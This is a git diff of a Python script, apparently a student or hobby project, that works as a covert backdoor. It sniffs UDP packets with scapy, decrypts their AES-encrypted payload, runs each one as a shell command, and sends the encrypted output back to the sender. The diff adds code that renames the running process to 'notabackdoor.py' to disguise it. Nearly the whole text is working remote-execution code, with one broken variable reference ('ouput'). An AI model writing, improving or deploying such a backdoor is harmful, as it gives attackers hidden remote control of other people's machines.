@@ -1,31 +1,30 @@
-import sys, os, argparse, socket, subprocess, logging, time, subprocess
+import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from AesEncryption import *
 
-FILTER = "udp and (dst port 80) and (src port 8000)"
+def executeShellCommand(command):
+    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
+    return outputString
 
-def remoteExecute(pkt):
-    print "==============================================="
-    command = decrypt(pkt['Raw'].load)
-    print command
-    print "==============================================="
+def parsePacket(receivedPacket):
 
-    variable = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    ouput = "\nOUTPUT:\n" + variable.stdout.read() + variable.stderr.read()
+    command = decrypt(receivedPacket['Raw'].load)
+    print "Excuting: " + command
+    output = executeShellCommand(command)
+    print "Output: " + output
 
-    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/ouput
-    print pkt2.show
-    print "==============================================="
+    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=receivedPacket['UDP'].dport)/encrypt(ouput)
     time.sleep(0.5)
-    send(pkt2)
 
-def stopfilter(pkt):
-    return True
+    print "Sending Packet: "
+    print returnPacket.show
+    send(returnPacket)
 
 def main():
-
-    sniff(filter=FILTER, prn=remoteExecute)
+    setproctitle.setproctitle("notabackdoor.py")
+    sniff(filter="udp and (dst port 80) and (src port 8000)", prn=parsePacket)
 
 if __name__ == '__main__':
     main()
